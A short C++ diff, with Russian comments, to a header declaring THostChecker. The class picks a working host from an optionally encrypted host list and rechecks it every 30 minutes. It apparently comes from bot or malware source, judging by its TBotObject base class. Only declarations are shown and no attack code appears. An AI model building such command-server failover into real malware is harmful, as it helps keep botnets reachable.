@@ -170,22 +170,27 @@ namespace Hosts
 //----------------------------------------------------
 //  THostChecker - Система поиска рабочего хоста
 //----------------------------------------------------
-class THostChecker : public TBotClass
+
+const DWORD HostCheckInterval = 1800000; /* допускаем проверки раз в 30 минут */
+
+class THostChecker : public TBotObject
 {
 private:
 	PList FHosts;
 	string FWorkHost;
-	DWORD CheckTime;
+	DWORD FCheckTime;
 	HANDLE FThread;
+    bool FTerminated;
+	friend DWORD WINAPI HostCheckerThreadProc(THostChecker *Checker);
 
-
+	void DoCheckHosts();
 public:
 	// На вход принимаютсся буфер хостов отделёнными
 	// нулевыми символами и оканчивающийся пустой строкой
 	// "host1\0host2\0\0"
 	THostChecker(const char *Hosts, bool HostsEncrypted);
 	~THostChecker();
-	void Check();
+	void Check(bool ReCheck = false);
     string GetWorkHost();
 };
 
